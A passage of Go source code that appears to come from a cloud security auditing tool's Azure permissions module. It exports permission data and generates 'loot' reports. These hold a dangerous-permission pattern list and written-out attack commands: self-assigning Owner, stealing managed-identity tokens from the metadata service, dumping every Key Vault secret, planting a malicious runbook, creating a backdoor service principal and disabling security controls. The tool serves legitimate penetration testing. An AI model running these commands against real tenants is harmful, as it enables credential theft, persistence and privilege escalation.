	if err := m.streamRowsToOutput(outDirectoryPath, logger); err != nil {
		logger.ErrorM(fmt.Sprintf("Error writing output: %v", err), globals.AZ_PERMISSIONS_MODULE_NAME)
		m.CommandCounter.Error++
		return
	}

	// Write loot files
	for _, l := range lootFiles {
		lootDir := internal.BuildLootDir(outDirectoryPath)
		if err := os.MkdirAll(lootDir, 0o755); err != nil {
			logger.ErrorM(fmt.Sprintf("Error creating loot directory: %v", err), globals.AZ_PERMISSIONS_MODULE_NAME)
			continue
		}
		lootPath := internal.BuildLootPath(outDirectoryPath, l.Name)
		if err := os.WriteFile(lootPath, []byte(l.Contents), 0644); err != nil {
			logger.ErrorM(fmt.Sprintf("Error writing loot file: %v", err), globals.AZ_PERMISSIONS_MODULE_NAME)
		} else {
			logger.InfoM(fmt.Sprintf("Output written to %s", lootPath), globals.AZ_PERMISSIONS_MODULE_NAME)
		}
	}

	// Count unique principals by streaming (no memory)
	uniquePrincipals := make(map[string]struct{})
	_ = m.iteratePermRows(func(row []string) {
		if len(row) > 0 && row[0] != "" {
			uniquePrincipals[row[0]] = struct{}{}
		}
	})
	logger.SuccessM(fmt.Sprintf("Found %d permission entries across %d principals",
		m.permRowCount, len(uniquePrincipals)), globals.AZ_PERMISSIONS_MODULE_NAME)
}

// streamRowsToOutput streams all rows from the temp CSV file to final CSV, JSONL, and table files.
// This never loads all rows into memory.
func (m *PermissionsModule) streamRowsToOutput(outDir string, logger internal.Logger) error {
	safeName := "permissions"

	// Open output files
	var csvFile, jsonlFile, tableFile *os.File

	// CSV
	csvDir := internal.BuildCSVDir(outDir)
	if err := os.MkdirAll(csvDir, 0o755); err != nil {
		return err
	}
	csvPath := internal.BuildCSVPath(outDir, safeName)
	var err error
	csvFile, err = os.Create(csvPath)
	if err != nil {
		return fmt.Errorf("failed to create csv file: %w", err)
	}
	defer csvFile.Close()

	// Write CSV header
	csvWriter := csv.NewWriter(csvFile)
	_ = csvWriter.Write(PermissionsHeader)

	// JSONL
	jsonDir := internal.BuildJSONDir(outDir)
	if err := os.MkdirAll(jsonDir, 0o755); err != nil {
		return err
	}
	jsonlPath := internal.BuildJSONLPath(outDir, safeName)
	jsonlFile, err = os.Create(jsonlPath)
	if err != nil {
		return fmt.Errorf("failed to create jsonl file: %w", err)
	}
	defer jsonlFile.Close()

	// Table (tab-delimited)
	tableDir := internal.BuildTableDir(outDir)
	if err := os.MkdirAll(tableDir, 0o755); err != nil {
		return err
	}
	tablePath := internal.BuildTablePath(outDir, safeName)
	tableFile, err = os.Create(tablePath)
	if err != nil {
		return fmt.Errorf("failed to create table file: %w", err)
	}
	defer tableFile.Close()

	// Write table header
	_, _ = tableFile.WriteString(strings.Join(PermissionsHeader, "\t") + "\n")

	// Stream all rows
	jsonEncoder := json.NewEncoder(jsonlFile)
	err = m.iteratePermRows(func(row []string) {
		// CSV
		_ = csvWriter.Write(row)

		// JSONL
		rowMap := make(map[string]string, len(PermissionsHeader))
		for i, col := range row {
			if i < len(PermissionsHeader) {
				rowMap[PermissionsHeader[i]] = col
			}
		}
		_ = jsonEncoder.Encode(rowMap)

		// Table (tab-delimited)
		_, _ = tableFile.WriteString(strings.Join(row, "\t") + "\n")
	})

	csvWriter.Flush()

	logger.InfoM(fmt.Sprintf("Output written to %s", csvPath), globals.AZ_PERMISSIONS_MODULE_NAME)
	logger.InfoM(fmt.Sprintf("Output written to %s", jsonlPath), globals.AZ_PERMISSIONS_MODULE_NAME)
	logger.InfoM(fmt.Sprintf("Output written to %s", tablePath), globals.AZ_PERMISSIONS_MODULE_NAME)

	return err
}

// ======================
// Loot File Generation
// ======================

// generatePermissionsLootFiles creates actionable loot files from permissions data
func (m *PermissionsModule) generatePermissionsLootFiles() []internal.LootFile {
	var lootFiles []internal.LootFile

	// 1. Dangerous permissions (write/delete/wildcard permissions)
	if dangerousLoot := m.generateDangerousPermissionsLoot(); dangerousLoot != "" {
		lootFiles = append(lootFiles, internal.LootFile{
			Name:     "permissions-dangerous",
			Contents: dangerousLoot,
		})
	}

	// 2. Service principals with dangerous permissions
	if spLoot := m.generateServicePrincipalPermissionsLoot(); spLoot != "" {
		lootFiles = append(lootFiles, internal.LootFile{
			Name:     "permissions-service-principals",
			Contents: spLoot,
		})
	}

	// 3. Permission enumeration commands
	if enumLoot := m.generatePermissionEnumerationCommandsLoot(); enumLoot != "" {
		lootFiles = append(lootFiles, internal.LootFile{
			Name:     "permissions-enumeration-commands",
			Contents: enumLoot,
		})
	}

	// 4. Privilege escalation paths based on dangerous permissions
	if escLoot := m.generatePrivilegeEscalationPathsLoot(); escLoot != "" {
		lootFiles = append(lootFiles, internal.LootFile{
			Name:     "permissions-privilege-escalation",
			Contents: escLoot,
		})
	}

	return lootFiles
}

// generateDangerousPermissionsLoot identifies highly privileged/dangerous permissions
func (m *PermissionsModule) generateDangerousPermissionsLoot() string {
	// Define dangerous permission patterns
	dangerousPatterns := map[string]string{
		"Microsoft.Authorization/roleAssignments/write": "Can assign Azure RBAC roles - CRITICAL for privilege escalation",
		"Microsoft.Authorization/*/write":               "Can modify authorization settings",
		"Microsoft.Compute/virtualMachines/runCommand":  "Can execute commands on VMs - remote code execution",
		"Microsoft.KeyVault/vaults/secrets/read":        "Can read Key Vault secrets - credential access",
		"Microsoft.Storage/storageAccounts/listKeys":    "Can list storage account keys - full storage access",
		"Microsoft.Sql/servers/databases/*":             "Full database access",
		"Microsoft.Web/sites/config/*":                  "Can access app service configurations and connection strings",
		"Microsoft.ContainerService/managedClusters/*":  "Full AKS cluster access - potential container escape",
		"Microsoft.Automation/automationAccounts/*":     "Can create/modify automation runbooks - code execution",
		"Microsoft.Compute/virtualMachines/write":       "Can create/modify VMs",
		"Microsoft.Network/networkSecurityGroups/write": "Can modify network security rules",
		"*":                     "Wildcard permission - effectively full control",
		"Microsoft.*/*":         "Wildcard over Microsoft resources",
		"Microsoft.*/*/write":   "Wildcard write permission",
		"Microsoft.*/*/delete":  "Wildcard delete permission",
		"Microsoft.Graph/*":     "Microsoft Graph API access",
		"Directory.ReadWrite.*": "Can modify Entra ID directory",
	}

	type DangerousPermission struct {
		PrincipalGUID string
		PrincipalName string
		PrincipalUPN  string
		PrincipalType string
		RoleName      string
		Permission    string
		PermType      string
		Scope         string
		AssignedVia   string
		Description   string
	}

	var dangerousPerms []DangerousPermission
	seenCombinations := make(map[string]bool)

	// Scan all permission rows (streaming from disk)
	_ = m.iteratePermRows(func(row []string) {
		if len(row) < 14 {
			return
		}

		principalGUID := row[0]
		principalName := row[1]
		principalUPN := row[2]
		principalType := row[3]
		roleName := row[4]
		permType := row[5]
		permission := row[6]
		scope := row[11]
		assignedVia := row[12]

		// Check if this permission matches any dangerous pattern
		for pattern, description := range dangerousPatterns {
			if matchesPermissionPattern(permission, pattern) {
				// Deduplicate by principal+permission+scope
				key := fmt.Sprintf("%s|%s|%s", principalGUID, permission, scope)
				if !seenCombinations[key] {
					seenCombinations[key] = true
					dangerousPerms = append(dangerousPerms, DangerousPermission{
						PrincipalGUID: principalGUID,
						PrincipalName: principalName,
						PrincipalUPN:  principalUPN,
						PrincipalType: principalType,
						RoleName:      roleName,
						Permission:    permission,
						PermType:      permType,
						Scope:         scope,
						AssignedVia:   assignedVia,
						Description:   description,
					})
				}
				break
			}
		}
	})

	if len(dangerousPerms) == 0 {
		return ""
	}

	var loot strings.Builder
	loot.WriteString("# Dangerous Permissions Found\n\n")
	loot.WriteString(fmt.Sprintf("Found %d dangerous permission assignments that could be used for privilege escalation or data access.\n\n", len(dangerousPerms)))

	// Group by principal
	principalGroups := make(map[string][]DangerousPermission)
	for _, perm := range dangerousPerms {
		principalGroups[perm.PrincipalGUID] = append(principalGroups[perm.PrincipalGUID], perm)
	}

	loot.WriteString("## Principals with Dangerous Permissions\n\n")
	for principalGUID, perms := range principalGroups {
		firstPerm := perms[0]
		loot.WriteString(fmt.Sprintf("### %s (%s)\n", firstPerm.PrincipalName, firstPerm.PrincipalType))
		loot.WriteString(fmt.Sprintf("- **Principal GUID**: %s\n", principalGUID))
		loot.WriteString(fmt.Sprintf("- **UPN/AppID**: %s\n\n", firstPerm.PrincipalUPN))

		loot.WriteString("**Dangerous Permissions**:\n")
		for _, perm := range perms {
			loot.WriteString(fmt.Sprintf("- `%s` (%s) via role **%s**\n", perm.Permission, perm.PermType, perm.RoleName))
			loot.WriteString(fmt.Sprintf("  - Scope: `%s`\n", perm.Scope))
			loot.WriteString(fmt.Sprintf("  - Assigned via: %s\n", perm.AssignedVia))
			loot.WriteString(fmt.Sprintf("  - Risk: %s\n", perm.Description))
		}

		loot.WriteString("\n**Investigation Commands**:\n")
		loot.WriteString(fmt.Sprintf("```bash\n# Get full details about this principal\naz ad sp show --id %s\naz ad user show --id %s\n\n", principalGUID, principalGUID))
		loot.WriteString(fmt.Sprintf("# Get all role assignments for this principal\naz role assignment list --assignee %s --all --output table\n\n", principalGUID))
		loot.WriteString("# Check for PIM eligibility\naz rest --method GET --url \"https://management.azure.com/providers/Microsoft.Authorization/roleEligibilityScheduleInstances?api-version=2020-10-01&$filter=asTarget()\"\n```\n\n")
	}

	return loot.String()
}

// generateServicePrincipalPermissionsLoot identifies service principals with dangerous permissions
func (m *PermissionsModule) generateServicePrincipalPermissionsLoot() string {
	type SPWithPerms struct {
		GUID        string
		Name        string
		AppID       string
		Permissions []string
		Roles       []string
		Scopes      []string
	}

	spMap := make(map[string]*SPWithPerms)

	// Find all service principals with write/wildcard permissions (streaming from disk)
	_ = m.iteratePermRows(func(row []string) {
		if len(row) < 14 {
			return
		}

		principalType := row[3]
		if !strings.Contains(strings.ToLower(principalType), "serviceprincipal") &&
			!strings.Contains(strings.ToLower(principalType), "managedidentity") {
			return
		}

		permission := row[6]
		// Look for write, delete, or wildcard permissions
		if !strings.Contains(strings.ToLower(permission), "write") &&
			!strings.Contains(strings.ToLower(permission), "delete") &&
			!strings.Contains(permission, "*") &&
			!strings.Contains(permission, "listKeys") &&
			!strings.Contains(permission, "runCommand") {
			return
		}

		principalGUID := row[0]
		if _, exists := spMap[principalGUID]; !exists {
			spMap[principalGUID] = &SPWithPerms{
				GUID:        principalGUID,
				Name:        row[1],
				AppID:       row[2],
				Permissions: []string{},
				Roles:       []string{},
				Scopes:      []string{},
			}
		}

		// Add unique permissions, roles, and scopes
		sp := spMap[principalGUID]
		if !permissionsContains(sp.Permissions, permission) {
			sp.Permissions = append(sp.Permissions, permission)
		}
		roleName := row[4]
		if !permissionsContains(sp.Roles, roleName) {
			sp.Roles = append(sp.Roles, roleName)
		}
		scope := row[11]
		if !permissionsContains(sp.Scopes, scope) {
			sp.Scopes = append(sp.Scopes, scope)
		}
	})

	if len(spMap) == 0 {
		return ""
	}

	var loot strings.Builder
	loot.WriteString("# Service Principals with Dangerous Permissions\n\n")
	loot.WriteString(fmt.Sprintf("Found %d service principals/managed identities with write, delete, or wildcard permissions.\n", len(spMap)))
	loot.WriteString("These are high-value targets for exploitation as they often have over-privileged access.\n\n")

	for _, sp := range spMap {
		loot.WriteString(fmt.Sprintf("## %s\n", sp.Name))
		loot.WriteString(fmt.Sprintf("- **Object ID**: %s\n", sp.GUID))
		loot.WriteString(fmt.Sprintf("- **App/Client ID**: %s\n", sp.AppID))
		loot.WriteString(fmt.Sprintf("- **Roles**: %s\n", strings.Join(sp.Roles, ", ")))
		loot.WriteString(fmt.Sprintf("- **Permissions**: %d dangerous permissions\n", len(sp.Permissions)))
		loot.WriteString(fmt.Sprintf("- **Scopes**: %d\n\n", len(sp.Scopes)))

		loot.WriteString("**Dangerous Permissions**:\n")
		for _, perm := range sp.Permissions {
			loot.WriteString(fmt.Sprintf("- `%s`\n", perm))
		}

		loot.WriteString("\n**Investigation Commands**:\n")
		loot.WriteString("```bash\n# Get service principal details\n")
		loot.WriteString(fmt.Sprintf("az ad sp show --id %s --output json\n\n", sp.GUID))
		loot.WriteString("# Check for credentials/certificates\n")
		loot.WriteString(fmt.Sprintf("az ad sp credential list --id %s\n\n", sp.GUID))
		loot.WriteString("# Check for federated credentials (workload identity)\n")
		loot.WriteString(fmt.Sprintf("az ad app federated-credential list --id %s\n\n", sp.AppID))
		loot.WriteString("# Get full role assignments\n")
		loot.WriteString(fmt.Sprintf("az role assignment list --assignee %s --all --output table\n", sp.GUID))
		loot.WriteString("```\n\n")
	}

	loot.WriteString("\n## Exploitation Notes\n\n")
	loot.WriteString("Service principals can be compromised through:\n")
	loot.WriteString("1. **Client Secret/Certificate Theft**: Check automation code, CI/CD pipelines, config files\n")
	loot.WriteString("2. **Federated Credentials**: Exploit OIDC token exchange if federated identity is misconfigured\n")
	loot.WriteString("3. **Managed Identity IMDS**: Access Azure Instance Metadata Service from compromised VMs/containers\n")
	loot.WriteString("4. **Key Vault References**: Service principals often store credentials in Key Vault\n\n")

	return loot.String()
}

// generatePermissionEnumerationCommandsLoot creates commands for further enumeration
func (m *PermissionsModule) generatePermissionEnumerationCommandsLoot() string {
	var loot strings.Builder
	loot.WriteString("# Permission Enumeration Commands\n\n")
	loot.WriteString("Use these commands to further investigate permissions and identify privilege escalation opportunities.\n\n")

	// Get unique tenant IDs and subscription IDs (streaming from disk)
	tenants := make(map[string]string) // tenantID -> tenantName
	subscriptions := make(map[string]bool)

	_ = m.iteratePermRows(func(row []string) {
		if len(row) >= 14 {
			tenantName := row[7]
			tenantID := row[8]
			if tenantName != "" && tenantID != "" {
				tenants[tenantID] = tenantName
			}

			scope := row[11]
			if strings.HasPrefix(scope, "/subscriptions/") {
				parts := strings.Split(scope, "/")
				if len(parts) >= 3 {
					subscriptions[parts[2]] = true
				}
			}
		}
	})

	loot.WriteString("## Tenant-Level Enumeration\n\n")
	for tenantID, tenantName := range tenants {
		loot.WriteString(fmt.Sprintf("### %s (%s)\n\n", tenantName, tenantID))
		loot.WriteString("```bash\n")
		loot.WriteString(fmt.Sprintf("# Set tenant context\naz account set --tenant %s\n\n", tenantID))
		loot.WriteString("# List all custom roles (custom roles often have dangerous permissions)\n")
		loot.WriteString("az role definition list --custom-role-only true --output table\n\n")
		loot.WriteString("# List all Entra ID directory roles\n")
		loot.WriteString("az rest --method GET --url \"https://graph.microsoft.com/v1.0/directoryRoles\"\n\n")
		loot.WriteString("# List all Entra ID directory role assignments\n")
		loot.WriteString("az rest --method GET --url \"https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?$expand=principal\"\n\n")
		loot.WriteString("# Check for PIM eligibility\n")
		loot.WriteString("az rest --method GET --url \"https://management.azure.com/providers/Microsoft.Authorization/roleEligibilityScheduleInstances?api-version=2020-10-01&$filter=asTarget()\"\n")
		loot.WriteString("```\n\n")
	}

	if len(subscriptions) > 0 {
		loot.WriteString("## Subscription-Level Enumeration\n\n")
		loot.WriteString("```bash\n")
		for subID := range subscriptions {
			loot.WriteString(fmt.Sprintf("# Subscription: %s\n", subID))
			loot.WriteString(fmt.Sprintf("az role assignment list --all --subscription %s --output table\n\n", subID))
		}
		loot.WriteString("```\n\n")
	}

	loot.WriteString("## Specific Permission Checks\n\n")
	loot.WriteString("```bash\n")
	loot.WriteString("# Find principals with roleAssignments/write (can assign roles)\n")
	loot.WriteString("grep -i \"roleAssignments/write\" cloudfox-output/azure/permissions.csv\n\n")
	loot.WriteString("# Find principals with Key Vault access\n")
	loot.WriteString("grep -i \"Microsoft.KeyVault\" cloudfox-output/azure/permissions.csv\n\n")
	loot.WriteString("# Find principals with VM command execution\n")
	loot.WriteString("grep -i \"runCommand\" cloudfox-output/azure/permissions.csv\n\n")
	loot.WriteString("# Find wildcard permissions\n")
	loot.WriteString("grep \"\\*\" cloudfox-output/azure/permissions.csv\n\n")
	loot.WriteString("# Find storage account key access\n")
	loot.WriteString("grep -i \"listKeys\" cloudfox-output/azure/permissions.csv\n")
	loot.WriteString("```\n\n")

	return loot.String()
}

// generatePrivilegeEscalationPathsLoot provides privilege escalation techniques based on found permissions
func (m *PermissionsModule) generatePrivilegeEscalationPathsLoot() string {
	// Track which escalation paths are relevant based on permissions found (streaming from disk)
	escalationPaths := make(map[string]bool)

	_ = m.iteratePermRows(func(row []string) {
		if len(row) < 14 {
			return
		}

		permission := row[6]

		// Identify relevant escalation paths
		if strings.Contains(permission, "Microsoft.Authorization/roleAssignments/write") ||
			strings.Contains(permission, "Microsoft.Authorization/*/write") {
			escalationPaths["role_assignment"] = true
		}
		if strings.Contains(permission, "Microsoft.Compute/virtualMachines/runCommand") {
			escalationPaths["vm_command_execution"] = true
		}
		if strings.Contains(permission, "Microsoft.KeyVault/vaults/secrets") {
			escalationPaths["keyvault_secrets"] = true
		}
		if strings.Contains(permission, "Microsoft.Storage/storageAccounts/listKeys") {
			escalationPaths["storage_keys"] = true
		}
		if strings.Contains(permission, "Microsoft.Automation/automationAccounts") {
			escalationPaths["automation_runbooks"] = true
		}
		if strings.Contains(permission, "Microsoft.Compute/virtualMachines/write") {
			escalationPaths["vm_creation"] = true
		}
		if strings.Contains(permission, "Microsoft.Web/sites/config") {
			escalationPaths["app_service_config"] = true
		}
		if strings.Contains(permission, "Microsoft.ContainerService/managedClusters") {
			escalationPaths["aks_access"] = true
		}
		if permission == "*" || strings.Contains(permission, "Microsoft.*/*") {
			escalationPaths["wildcard"] = true
		}
	})

	if len(escalationPaths) == 0 {
		return ""
	}

	var loot strings.Builder
	loot.WriteString("# Privilege Escalation Paths\n\n")
	loot.WriteString("Based on the dangerous permissions found, here are potential privilege escalation techniques:\n\n")

	if escalationPaths["role_assignment"] {
		loot.WriteString("## 1. Role Assignment Escalation\n\n")
		loot.WriteString("**Permission**: `Microsoft.Authorization/roleAssignments/write`\n\n")
		loot.WriteString("**Description**: Can assign Azure RBAC roles to any principal, including yourself.\n\n")
		loot.WriteString("**Exploitation**:\n")
		loot.WriteString("```bash\n")
		loot.WriteString("# Assign Owner role to yourself at subscription scope\n")
		loot.WriteString("MY_OBJECT_ID=$(az ad signed-in-user show --query id -o tsv)\n")
		loot.WriteString("SUBSCRIPTION_ID=$(az account show --query id -o tsv)\n\n")
		loot.WriteString("az role assignment create \\\n")
		loot.WriteString("  --role \"Owner\" \\\n")
		loot.WriteString("  --assignee-object-id $MY_OBJECT_ID \\\n")
		loot.WriteString("  --scope \"/subscriptions/$SUBSCRIPTION_ID\"\n")
		loot.WriteString("```\n\n")
	}

	if escalationPaths["vm_command_execution"] {
		loot.WriteString("## 2. VM Command Execution\n\n")
		loot.WriteString("**Permission**: `Microsoft.Compute/virtualMachines/runCommand/action`\n\n")
		loot.WriteString("**Description**: Can execute arbitrary commands on VMs, potentially accessing managed identity tokens.\n\n")
		loot.WriteString("**Exploitation**:\n")
		loot.WriteString("```bash\n")
		loot.WriteString("# List all VMs\n")
		loot.WriteString("az vm list --output table\n\n")
		loot.WriteString("# Execute command on target VM to steal managed identity token\n")
		loot.WriteString("az vm run-command invoke \\\n")
		loot.WriteString("  --resource-group <RG_NAME> \\\n")
		loot.WriteString("  --name <VM_NAME> \\\n")
		loot.WriteString("  --command-id RunShellScript \\\n")
		loot.WriteString("  --scripts \"curl -H Metadata:true 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'\"\n")
		loot.WriteString("```\n\n")
	}

	if escalationPaths["keyvault_secrets"] {
		loot.WriteString("## 3. Key Vault Secret Access\n\n")
		loot.WriteString("**Permission**: `Microsoft.KeyVault/vaults/secrets/read`\n\n")
		loot.WriteString("**Description**: Can read secrets from Key Vaults, often containing service principal credentials.\n\n")
		loot.WriteString("**Exploitation**:\n")
		loot.WriteString("```bash\n")
		loot.WriteString("# List all Key Vaults\n")
		loot.WriteString("az keyvault list --output table\n\n")
		loot.WriteString("# List secrets in a vault\n")
		loot.WriteString("az keyvault secret list --vault-name <VAULT_NAME> --output table\n\n")
		loot.WriteString("# Download all secrets\n")
		loot.WriteString("for secret in $(az keyvault secret list --vault-name <VAULT_NAME> --query \"[].name\" -o tsv); do\n")
		loot.WriteString("  echo \"Secret: $secret\"\n")
		loot.WriteString("  az keyvault secret show --vault-name <VAULT_NAME> --name $secret --query value -o tsv\n")
		loot.WriteString("done\n")
		loot.WriteString("```\n\n")
	}

	if escalationPaths["storage_keys"] {
		loot.WriteString("## 4. Storage Account Key Access\n\n")
		loot.WriteString("**Permission**: `Microsoft.Storage/storageAccounts/listKeys/action`\n\n")
		loot.WriteString("**Description**: Can list storage account access keys, granting full access to all data.\n\n")
		loot.WriteString("**Exploitation**:\n")
		loot.WriteString("```bash\n")
		loot.WriteString("# List all storage accounts\n")
		loot.WriteString("az storage account list --output table\n\n")
		loot.WriteString("# Get storage account keys\n")
		loot.WriteString("az storage account keys list \\\n")
		loot.WriteString("  --resource-group <RG_NAME> \\\n")
		loot.WriteString("  --account-name <STORAGE_ACCOUNT_NAME>\n\n")
		loot.WriteString("# Access storage using key\n")
		loot.WriteString("az storage blob list \\\n")
		loot.WriteString("  --account-name <STORAGE_ACCOUNT_NAME> \\\n")
		loot.WriteString("  --account-key <KEY> \\\n")
		loot.WriteString("  --container-name <CONTAINER_NAME>\n")
		loot.WriteString("```\n\n")
	}

	if escalationPaths["automation_runbooks"] {
		loot.WriteString("## 5. Automation Runbook Execution\n\n")
		loot.WriteString("**Permission**: `Microsoft.Automation/automationAccounts/*`\n\n")
		loot.WriteString("**Description**: Can create/modify automation runbooks that execute with managed identity privileges.\n\n")
		loot.WriteString("**Exploitation**:\n")
		loot.WriteString("```bash\n")
		loot.WriteString("# List automation accounts\n")
		loot.WriteString("az automation account list --output table\n\n")
		loot.WriteString("# Create malicious runbook\n")
		loot.WriteString("az automation runbook create \\\n")
		loot.WriteString("  --resource-group <RG_NAME> \\\n")
		loot.WriteString("  --automation-account-name <ACCOUNT_NAME> \\\n")
		loot.WriteString("  --name MaliciousRunbook \\\n")
		loot.WriteString("  --type PowerShell\n\n")
		loot.WriteString("# Upload runbook content (e.g., steal token, create backdoor)\n")
		loot.WriteString("az automation runbook replace-content \\\n")
		loot.WriteString("  --resource-group <RG_NAME> \\\n")
		loot.WriteString("  --automation-account-name <ACCOUNT_NAME> \\\n")
		loot.WriteString("  --name MaliciousRunbook \\\n")
		loot.WriteString("  --content @malicious.ps1\n\n")
		loot.WriteString("# Start runbook\n")
		loot.WriteString("az automation runbook start \\\n")
		loot.WriteString("  --resource-group <RG_NAME> \\\n")
		loot.WriteString("  --automation-account-name <ACCOUNT_NAME> \\\n")
		loot.WriteString("  --name MaliciousRunbook\n")
		loot.WriteString("```\n\n")
	}

	if escalationPaths["app_service_config"] {
		loot.WriteString("## 6. App Service Configuration Access\n\n")
		loot.WriteString("**Permission**: `Microsoft.Web/sites/config/*`\n\n")
		loot.WriteString("**Description**: Can read app service configurations containing connection strings and secrets.\n\n")
		loot.WriteString("**Exploitation**:\n")
		loot.WriteString("```bash\n")
		loot.WriteString("# List all web apps\n")
		loot.WriteString("az webapp list --output table\n\n")
		loot.WriteString("# Get connection strings (often contain credentials)\n")
		loot.WriteString("az webapp config connection-string list \\\n")
		loot.WriteString("  --resource-group <RG_NAME> \\\n")
		loot.WriteString("  --name <APP_NAME>\n\n")
		loot.WriteString("# Get app settings\n")
		loot.WriteString("az webapp config appsettings list \\\n")
		loot.WriteString("  --resource-group <RG_NAME> \\\n")
		loot.WriteString("  --name <APP_NAME>\n")
		loot.WriteString("```\n\n")
	}

	if escalationPaths["aks_access"] {
		loot.WriteString("## 7. AKS Cluster Access\n\n")
		loot.WriteString("**Permission**: `Microsoft.ContainerService/managedClusters/*`\n\n")
		loot.WriteString("**Description**: Can access AKS clusters, potentially escape to node and steal managed identity.\n\n")
		loot.WriteString("**Exploitation**:\n")
		loot.WriteString("```bash\n")
		loot.WriteString("# List AKS clusters\n")
		loot.WriteString("az aks list --output table\n\n")
		loot.WriteString("# Get admin credentials\n")
		loot.WriteString("az aks get-credentials \\\n")
		loot.WriteString("  --resource-group <RG_NAME> \\\n")
		loot.WriteString("  --name <CLUSTER_NAME> \\\n")
		loot.WriteString("  --admin\n\n")
		loot.WriteString("# Check for privileged pods\n")
		loot.WriteString("kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.containers[].securityContext.privileged==true)'\n\n")
		loot.WriteString("# Escape to node and access IMDS\n")
		loot.WriteString("kubectl run -it --rm --image=ubuntu attacker -- bash\n")
		loot.WriteString("# From within pod:\n")
		loot.WriteString("curl -H Metadata:true \"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/\"\n")
		loot.WriteString("```\n\n")
	}

	if escalationPaths["wildcard"] {
		loot.WriteString("## 8. Wildcard Permission Abuse\n\n")
		loot.WriteString("**Permission**: `*` or `Microsoft.*/*`\n\n")
		loot.WriteString("**Description**: Wildcard permissions grant nearly unlimited access to Azure resources.\n\n")
		loot.WriteString("**Exploitation**: With wildcard permissions, you can perform ANY of the above techniques plus:\n")
		loot.WriteString("```bash\n")
		loot.WriteString("# Create backdoor service principal\n")
		loot.WriteString("az ad sp create-for-rbac --name Backdoor --role Owner --scopes /subscriptions/<SUB_ID>\n\n")
		loot.WriteString("# Disable security controls\n")
		loot.WriteString("az security auto-provisioning-setting update --name default --auto-provision Off\n\n")
		loot.WriteString("# Export all data\n")
		loot.WriteString("# ... any resource access, creation, or modification\n")
		loot.WriteString("```\n\n")
	}

	loot.WriteString("## General Tips\n\n")
	loot.WriteString("- **Check PIM eligibility**: You may have additional permissions that can be activated\n")
	loot.WriteString("- **Group memberships**: Your groups may have additional permissions\n")
	loot.WriteString("- **Managed identities**: Compromising a VM/container gives you its managed identity\n")
	loot.WriteString("- **Service principals**: Look for credentials in code, Key Vault, environment variables\n")
	loot.WriteString("- **Custom roles**: Often have dangerous permission combinations\n\n")

	return loot.String()
}

// Helper functions

// matchesPermissionPattern checks if a permission matches a pattern (supports wildcards)
func matchesPermissionPattern(permission, pattern string) bool {
	if pattern == permission {
		return true
	}

	// Handle wildcard patterns
	if strings.Contains(pattern, "*") {
		// Convert glob pattern to regex
		regexPattern := strings.ReplaceAll(pattern, "*", ".*")
		regexPattern = strings.ReplaceAll(regexPattern, "/", "\\/")
		regexPattern = "^" + regexPattern + "$"

		matched, _ := regexp.MatchString(regexPattern, permission)
		return matched
	}

	return false
}

// contains checks if a string slice contains a string
// Helper functions made file-local to avoid redeclaration conflicts
func permissionsContains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}

// permissionsExtractResourceName extracts the resource name from a full Azure resource ID
func permissionsExtractResourceName(resourceID string) string {
	parts := strings.Split(resourceID, "/")
	if len(parts) > 0 {
		return parts[len(parts)-1]
	}
	return resourceID
}
